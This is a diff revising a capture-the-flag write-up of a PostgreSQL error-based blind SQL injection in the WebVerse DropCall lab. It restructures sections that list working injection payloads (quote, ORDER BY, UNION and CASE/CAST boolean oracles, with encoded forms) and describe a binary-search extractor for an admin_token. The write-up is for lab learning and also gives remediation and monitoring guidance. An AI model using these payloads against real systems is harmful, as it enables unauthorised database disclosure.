@@ -1,7 +1,7 @@
 ---
 title: "WebVerse DropCall — PostgreSQL Error-Based Blind SQL Injection"
 date: 2026-08-03T00:00:00+02:00
-lastmod: 2026-08-11T00:00:00+02:00
+lastmod: 2026-08-13T00:00:00+02:00
 draft: false
 author: "Mdk22"
 description: "A Caido-verified PostgreSQL blind SQL injection used a repeatable 200/500 error oracle to recover a sensitive configuration value."
@@ -107,168 +107,41 @@ All requests, screenshots, extraction statistics, and solved-state evidence belo
 
 The screenshots are primary evidence for the observable request/response chain. The narrative makes only the bounded conclusions supported by that chain.
 
-## 3. Establishing Normal Behavior
+## 3. Evidence-Led Chronological Reproduction
 
-The baseline request used a known park value:
+This section keeps every control, raw or encoded payload, expected HTTP channel, screenshot, and narrow conclusion beside the phase in which it was used. Temporary hosts, reusable cookies, the literal objective, local invocation, and private artifact paths remain unpublished. No independent `curl` command was executed, so no synthetic curl verification is added.
 
-```http
-GET /permits?park=yosemite HTTP/1.1
-```
+### 3.1 P-01 / P-02 — Normal and Benign-Negative Baselines
 
-The application returned HTTP 200 and five permit records. This established the normal successful response before any special characters or SQL structure were introduced.
-
-![Baseline request for yosemite returns HTTP 200 and five permit records](DropCall_Figure_01_Baseline.png)
-
-**Figure 1 — Baseline.** A known valid park value follows the expected successful search path.
-
-An arbitrary, non-existent park value also returned HTTP 200, but with the application's normal no-results response. This negative control matters because it separates an ordinary lookup miss from the later server-error behavior.
-
-![Unknown benign park returns the normal HTTP 200 no-results state](DropCall_Figure_02_Negative_Control.png)
-
-**Figure 2 — Negative control.** Benign unknown input does not produce the failure observed with SQL syntax.
-
-## 4. Quote Differential
-
-Appending a single quote to the otherwise valid value changed the response to HTTP 500 with a generic search-unavailable message.
-
-```text
-yosemite'
-```
-
-![Single-quote probe changes the response to HTTP 500](DropCall_Figure_03_Quote_Probe.png)
-
-**Figure 3 — Quote probe.** The quote produces a repeatable server-side failure distinct from the benign unknown-value control.
-
-This result is a strong injection signal, but it is not sufficient proof on its own. A quote can trigger failures in parsers or application logic unrelated to SQL. The following structural probes were therefore required.
-
-## 5. Projection-Width Differential
-
-The next tests compared adjacent `ORDER BY` positions while keeping the surrounding request path constant. `ORDER BY 1` returned HTTP 200.
-
-![ORDER BY 1 returns HTTP 200](DropCall_Figure_04_Order_By_1.png)
-
-**Figure 4 — Valid projection position.** The first sort position is accepted.
-
-Changing only the requested position to `ORDER BY 2` returned HTTP 500.
-
-![ORDER BY 2 returns HTTP 500](DropCall_Figure_05_Order_By_2.png)
-
-**Figure 5 — Invalid projection position.** The adjacent failure is consistent with a query branch exposing one selected column.
-
-The inference is deliberately narrow: it establishes the usable projection width for this tested branch. It does not identify the original column name, data type, schema, or database privileges.
-
-## 6. One-Column UNION Compatibility
-
-With the inferred width, a non-destructive `UNION SELECT NULL` probe returned HTTP 200.
-
-![One-column UNION SELECT NULL returns HTTP 200](DropCall_Figure_06_Union_Null.png)
-
-**Figure 6 — UNION compatibility.** The successful response supports controllable SQL structure and a one-column UNION shape.
-
-Together, the quote differential, adjacent `ORDER BY` behavior, and successful one-column UNION remove the principal false-positive explanation that the HTTP 500 response came from generic input validation alone.
-
-## 7. Building a Conditional Error Oracle
-
-The response did not directly print arbitrary query output, so the validation used a PostgreSQL conditional expression that deliberately raises an error only when a predicate is false:
-
-```sql
-CASE
-  WHEN (<PREDICATE>)
-  THEN 1
-  ELSE CAST(current_database() AS integer)
-END
-```
-
-For a true predicate, the expression returns the integer `1` and the application completes with HTTP 200.
-
-![True conditional predicate maps to HTTP 200](DropCall_Figure_07_Oracle_True.png)
-
-**Figure 7 — Oracle TRUE branch.** A known-true predicate produces the normal success status.
-
-For a false predicate, PostgreSQL attempts to cast the database name to an integer, causing the backend error reflected as HTTP 500.
-
-![False conditional predicate maps to HTTP 500](DropCall_Figure_08_Oracle_False.png)
-
-**Figure 8 — Oracle FALSE branch.** A known-false predicate produces the generic failure status.
-
-Both mappings were repeated twice before extraction. The application therefore exposed one reliable bit per request:
-
-| Predicate result | Database branch | HTTP result |
-| --- | --- | --- |
-| TRUE | Return integer `1` | 200 |
-| FALSE | Trigger invalid integer cast | 500 |
-
-This is an error-based blind oracle: the secret value is not directly returned, but Boolean facts about it can be learned from the stable status-code differential.
-
-## 8. Locating the Target Configuration
-
-The verified oracle was used to test the existence of the application-owned `public.internal_config` relation. The successful predicate confirmed that the relation was queryable through the injected statement.
-
-![Oracle confirms the public.internal_config relation](DropCall_Figure_09_Internal_Config.png)
-
-**Figure 9 — Relation confirmation.** The tested relation is accessible through the vulnerable query context.
-
-The extraction target was then narrowed to the `admin_token` record and its expected challenge-value format rather than enumerating unrelated configuration entries.
-
-![Oracle confirms the admin_token value format](DropCall_Figure_10_Admin_Token_Format.png)
-
-**Figure 10 — Target selection.** The predicate identifies the required configuration key and constrains extraction to the challenge flag format.
-
-## 9. Focused Blind Extraction
-
-A short Python script sent the same verified conditional request through Caido, testing one character position at a time. The extractor was deliberately bounded:
-
-- it queried only the `admin_token` value;
-- it used the already confirmed 200/500 oracle;
-- it counted every request;
-- it stopped immediately after the closing brace;
-- it printed only the redacted result in publication evidence.
-
-The fresh run required 301 requests and stopped at the explicit terminator.
-
-![Redacted Python extraction output showing 301 requests and the stop condition](DropCall_Figure_11_Extraction_Redacted.png)
-
-**Figure 11 — Focused extraction.** The script recovered the current-instance value as `WEBVERSE{REDACTED}` and terminated at the closing brace.
-
-The request count belongs to this reproduction only. It is not a universal performance property of the vulnerability because it depends on the tested character strategy and actual value length.
-
-## 10. Authoritative Validation
-
-The recovered current-instance value was submitted to WebVerse. The platform accepted it and displayed the solved state.
-
-![WebVerse DropCall challenge marked solved](DropCall_Figure_12_Solved_State.png)
-
-**Figure 12 — Authoritative solved state.** Platform acceptance independently confirms that the extracted value was correct for this instance.
-
-## 11. Reproduction Commands and Payloads
-
-This section preserves the copyable reproducibility layer from the fresh authorized reproduction. Every block below is source-grounded. Temporary hosts and reusable cookies are not published; `<LAB_HOST>` is the only host placeholder. The Caido and browser figures remain the proof layer.
-
-No independent curl command was executed during this reproduction, so this article does not claim curl verification or add a synthetic curl command.
-
-### Baseline Requests
-
-`P-01` establishes the legitimate request contract and normal permit-search behavior.
+P-01 established the legitimate request contract with a known park value.
 
 ```http
 GET /permits?park=yosemite HTTP/1.1
 Host: <LAB_HOST>
 ```
 
-Expected result: HTTP 200 with five active Yosemite permit records. This establishes normal behavior; it does not by itself demonstrate SQL injection.
+**Expected semantic result:** HTTP 200 with five active Yosemite permit records. This establishes normal behavior and does not itself demonstrate SQL injection.
 
-`P-02` is the benign negative control:
+![Baseline request for yosemite returns HTTP 200 and five permit records](DropCall_Figure_01_Baseline.png)
+
+**Figure 1 — Valid baseline.** A known park follows the expected successful search path.
+
+P-02 used a syntactically benign value that did not exist in the application dataset.
 
 ```http
 GET /permits?park=__dropcall_no_match_7f29c1__ HTTP/1.1
 Host: <LAB_HOST>
 ```
 
-Expected result: HTTP 200 with `No active permits for that park`, not the search-failure page. An empty result is therefore normal application behavior.
+**Expected semantic result:** HTTP 200 with `No active permits for that park`, not the generic search-failure page.
 
-### Verified Proof Payloads
+![Unknown benign park returns the normal HTTP 200 no-results state](DropCall_Figure_02_Negative_Control.png)
 
-`P-03` is the initial quote probe. Caido encoded the apostrophe as `%27` in the request target.
+**Figure 2 — Benign negative control.** An ordinary lookup miss remains on the normal HTTP 200 path, separating empty results from the later SQL-related failure channel.
+
+### 3.2 P-03 — Single-Quote Differential
+
+P-03 appended one apostrophe to the otherwise valid value. Caido encoded it as `%27` in the request target.
 
 ```text
 yosemite'
@@ -278,9 +151,17 @@ yosemite'
 park=yosemite%27
 ```
 
-Expected result: HTTP 500 with `Search temporarily unavailable`. This is an SQL-context signal, not final proof alone.
+**Expected semantic result:** HTTP 500 with `Search temporarily unavailable`.
 
-`P-04` and `P-05` establish the adjacent projection boundary. The trailing comment space is represented by the final `%20` in the encoded forms.
+![Single-quote probe changes the response to HTTP 500](DropCall_Figure_03_Quote_Probe.png)
+
+**Figure 3 — Quote differential.** The quote produces a repeatable failure distinct from the benign no-results control. This is a strong SQL-context signal, but not final proof: a quote can also trigger non-SQL parser or application failures.
+
+### 3.3 P-04 / P-05 — Projection-Width Differential
+
+The next controls compared adjacent `ORDER BY` positions while keeping the surrounding request contract fixed. The trailing SQL comment space is preserved as the final `%20` in each encoded form.
+
+**P-04 — First projection position.**
 
 ```text
 yosemite' ORDER BY 1 --
@@ -290,7 +171,13 @@ yosemite' ORDER BY 1 --
 park=yosemite%27%20ORDER%20BY%201%20--%20
 ```
 
-Expected result: HTTP 200 on the normal no-results path.
+**Expected semantic result:** HTTP 200 on the normal no-results path.
+
+![ORDER BY 1 returns HTTP 200](DropCall_Figure_04_Order_By_1.png)
+
+**Figure 4 — Valid position.** The tested branch accepts the first sort position.
+
+**P-05 — Adjacent projection position.**
 
 ```text
 yosemite' ORDER BY 2 --
@@ -300,9 +187,17 @@ yosemite' ORDER BY 2 --
 park=yosemite%27%20ORDER%20BY%202%20--%20
 ```
 
-Expected result: HTTP 500 with the generic failure page. Together the two controls support a one-column projection; they do not identify original column names, types, or database privileges.
+**Expected semantic result:** HTTP 500 with the generic failure page.
 
-`P-06` validates the exact-width UNION expression:
+![ORDER BY 2 returns HTTP 500](DropCall_Figure_05_Order_By_2.png)
+
+**Figure 5 — Invalid position.** The adjacent 200/500 differential is consistent with this tested query branch exposing one selected column.
+
+The inference is deliberately narrow: it establishes a usable projection width for this branch. It does not identify the original column name, type, schema, or database privileges.
+
+### 3.4 P-06 — One-Column UNION Compatibility
+
+P-06 used a non-destructive expression matching the inferred width.
 
 ```text
 yosemite' UNION SELECT NULL --
@@ -312,39 +207,90 @@ yosemite' UNION SELECT NULL --
 park=yosemite%27%20UNION%20SELECT%20NULL%20--%20
 ```
 
-Expected result: HTTP 200 on the normal no-results path. This confirms the one-column UNION shape, not in-band output.
+**Expected semantic result:** HTTP 200 on the normal no-results path.
 
-`P-07` and `P-08` bind the conditional-error Boolean oracle. Each was repeated once with the same HTTP outcome.
+![One-column UNION SELECT NULL returns HTTP 200](DropCall_Figure_06_Union_Null.png)
+
+**Figure 6 — UNION compatibility.** The successful response confirms controllable SQL structure and a compatible one-column UNION shape, not an in-band output channel.
+
+Together, P-03 through P-06 remove the principal false-positive explanation that the HTTP 500 response came from generic input validation alone.
+
+### 3.5 P-07 / P-08 — Repeated Conditional-Error Oracle
+
+Because the application did not print arbitrary query output, validation used a PostgreSQL `CASE WHEN` expression whose false branch deliberately attempts to cast the database name to an integer.
 
 ```sql
--- P-07: TRUE control -> HTTP 200
+CASE
+  WHEN (<PREDICATE>)
+  THEN 1
+  ELSE CAST(current_database() AS integer)
+END
+```
+
+**P-07 — Known-true control.**
+
+```sql
 yosemite' UNION SELECT CASE WHEN (1=1) THEN 1 ELSE CAST(current_database() AS integer) END --
 ```
 
+**Expected semantic result:** the integer branch completes with HTTP 200.
+
+![True conditional predicate maps to HTTP 200](DropCall_Figure_07_Oracle_True.png)
+
+**Figure 7 — TRUE branch.** A known-true predicate maps to the normal success channel.
+
+**P-08 — Known-false control.**
+
 ```sql
--- P-08: FALSE control -> HTTP 500
 yosemite' UNION SELECT CASE WHEN (1=2) THEN 1 ELSE CAST(current_database() AS integer) END --
 ```
 
-The true branch returns an integer; the false branch deliberately selects the failing cast. The 200/500 mapping is the oracle, not a direct query-output channel.
+**Expected semantic result:** PostgreSQL evaluates the failing cast and the application returns HTTP 500.
 
-`P-09` confirms only the known objective-relevant relation, without broad enumeration:
+![False conditional predicate maps to HTTP 500](DropCall_Figure_08_Oracle_False.png)
+
+**Figure 8 — FALSE branch.** A known-false predicate maps to the generic failure channel.
+
+Both P-07 and P-08 were repeated once with the same outcome before extraction.
+
+| Predicate result | Database branch | HTTP result |
+| --- | --- | --- |
+| TRUE | Return integer `1` | 200 |
+| FALSE | Trigger invalid integer cast | 500 |
+
+This is an error-based blind oracle: the secret is not returned directly, but one Boolean fact can be learned from each stable HTTP outcome.
+
+### 3.6 P-09 — Objective-Relevant Relation Confirmation
+
+P-09 tested only the known objective-relevant relation and did not perform broad schema enumeration.
 
 ```sql
 yosemite' UNION SELECT CASE WHEN (EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema='public' AND table_name='internal_config')) THEN 1 ELSE CAST(current_database() AS integer) END --
 ```
 
-Expected result: the TRUE channel (HTTP 200). This establishes that `public.internal_config` exists in the fresh instance, not any row value.
+**Expected semantic result:** the TRUE channel, HTTP 200.
 
-`P-10` identifies the target key and public flag format while keeping the value undisclosed:
+![Oracle confirms the public.internal_config relation](DropCall_Figure_09_Internal_Config.png)
+
+**Figure 9 — Relation confirmation.** The predicate establishes that `public.internal_config` exists and is queryable in the vulnerable context. It does not disclose any row value.
+
+### 3.7 P-10 — Target Key and Format Confirmation
+
+The target was narrowed to `admin_token` and the expected challenge-value shape before character extraction.
 
 ```sql
 yosemite' UNION SELECT CASE WHEN (EXISTS(SELECT 1 FROM public.internal_config WHERE k='admin_token' AND left(value,9)='WEBVERSE{' AND right(value,1)='}')) THEN 1 ELSE CAST(current_database() AS integer) END --
 ```
 
-Expected result: the TRUE channel (HTTP 200), confirming the `admin_token` key and `WEBVERSE{...}` shape.
+**Expected semantic result:** the TRUE channel, HTTP 200, confirming the key and `WEBVERSE{...}` format while leaving the value undisclosed.
 
-`P-11` is the exact scalar query used by the bounded Python extractor:
+![Oracle confirms the admin_token value format](DropCall_Figure_10_Admin_Token_Format.png)
+
+**Figure 10 — Target selection.** The predicate identifies the required configuration record and bounds the subsequent extraction to the challenge value.
+
+### 3.8 P-11 / P-12 — Bounded Blind Extraction
+
+P-11 was the exact scalar query used by the focused Python extractor.
 
 ```sql
 SELECT value
@@ -353,11 +299,40 @@ WHERE k = 'admin_token'
 LIMIT 1
 ```
 
-`P-12` remains described rather than published as a full script: the executed extractor rechecked the true and false controls, used `get_byte(convert_to(..., 'UTF8'), offset)` with binary-search comparisons and exact-equality checks, and stopped at the closing flag delimiter. It queried only this scalar, completed in 301 requests, and never published the literal result, local invocation, temporary host binding, or private artifact paths.
+P-12 remains described rather than published as a full script. The executed extractor:
 
-The decisive proof remains the WebVerse solved-state. Copyable payloads support reproducibility; they do not replace the repeated oracle controls, source evidence, or authoritative platform acceptance.
+- rechecked the known-true and known-false controls;
+- queried only the P-11 scalar;
+- used `get_byte(convert_to(..., 'UTF8'), offset)` with binary-search comparisons and exact-equality checks;
+- counted every request;
+- stopped immediately at the closing flag delimiter;
+- withheld the literal result, local invocation, temporary host binding, and private artifact paths.
 
-## 12. Vulnerability Classification
+The fresh run completed in 301 requests.
+
+![Redacted Python extraction output showing 301 requests and the stop condition](DropCall_Figure_11_Extraction_Redacted.png)
+
+**Figure 11 — Focused extraction.** The extractor recovered `WEBVERSE{REDACTED}` and terminated at the explicit closing brace.
+
+The request count belongs only to this reproduction; it depends on the character strategy and actual value length and is not a universal performance property of the vulnerability.
+
+### 3.9 Authoritative Solved State
+
+The recovered current-instance value was submitted to WebVerse, which accepted it and displayed the solved state.
+
+![WebVerse DropCall challenge marked solved](DropCall_Figure_12_Solved_State.png)
+
+**Figure 12 — Authoritative validation.** Platform acceptance independently confirms that the extracted value was correct for this active instance.
+
+### 3.10 Evidence Closure and Stop Boundary
+
+The decisive proof is the complete chain: normal controls, quote differential, adjacent projection boundary, compatible UNION, repeated Boolean oracle, bounded relation and key selection, focused extraction, and authoritative platform acceptance. Copyable payloads support reproducibility but do not replace those controls or their evidence.
+
+> **STOP BOUNDARY**
+>
+> Testing stopped after recovery and acceptance of the single `admin_token` objective. No destructive SQL, write action, broad schema or table dump, privilege escalation, operating-system execution, unrelated endpoint testing, or synthetic curl verification was performed.
+
+## 4. Vulnerability Classification
 
 | Attribute | Verified value |
 | --- | --- |
@@ -375,7 +350,7 @@ The decisive proof remains the WebVerse solved-state. Copyable payloads support 
 
 No secondary CWE is required to establish the central weakness. Sensitive configuration disclosure is recorded as an observed pattern and impact, while CWE-89 remains the direct root-cause classification.
 
-## 13. False-Positive Controls
+## 5. False-Positive Controls
 
 The finding rests on multiple independent controls rather than a single anomalous response:
 
@@ -390,13 +365,13 @@ The finding rests on multiple independent controls rather than a single anomalou
 
 This chain supports SQL injection and targeted data disclosure. It does not support claims of write access, operating-system command execution, unrestricted database compromise, or access to data that was not tested.
 
-## 14. Impact
+## 6. Impact
 
 An unauthenticated user who can reach the permit-search endpoint can use database syntax in `park` to infer Boolean facts and recover sensitive application configuration. In the authorized reproduction, the confirmed impact was read access to the `admin_token` value required to solve the challenge.
 
 In a production system, the impact would depend on the database account's permissions and the data reachable from the vulnerable query. Plausible consequences include disclosure of credentials, tokens, customer data, or internal operational metadata. Those broader outcomes were not tested here and are not presented as confirmed effects.
 
-## 15. Remediation
+## 7. Remediation
 
 ### Parameterize the Query
 
@@ -418,7 +393,7 @@ Return a consistent application response for backend query failures and record t
 
 Alert on repeated requests containing SQL metacharacters, UNION/ORDER BY probes, rapidly changing predicates, or high-frequency 200/500 alternation. Monitoring is a detection layer, not a replacement for safe query construction.
 
-## 16. Validation After the Fix
+## 8. Validation After the Fix
 
 After remediation, repeat the same bounded controls:
 
